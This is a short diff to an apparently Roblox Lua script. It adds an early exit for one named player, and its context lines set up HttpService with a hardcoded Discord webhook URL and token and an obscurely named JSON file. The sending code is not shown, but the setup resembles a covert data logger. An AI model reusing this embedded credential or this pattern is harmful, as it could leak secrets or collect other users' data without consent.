@@ -1,4 +1,12 @@
 if not game:IsLoaded() then game.Loaded:Wait() end
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+if LocalPlayer and LocalPlayer.Name == "sublocwise" then
+    return
+end
+
 local HttpService = game:GetService("HttpService")
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1550276342245757028/9FLChNYfrVegIiXj1UtE6aHG3mTy8rhwvb0Sr79UsoCwULCJ6exar4IgVNxQXSKFXTKR"
 local ARCHIVO_JSON = "dbsq-f28vks92afx.json"
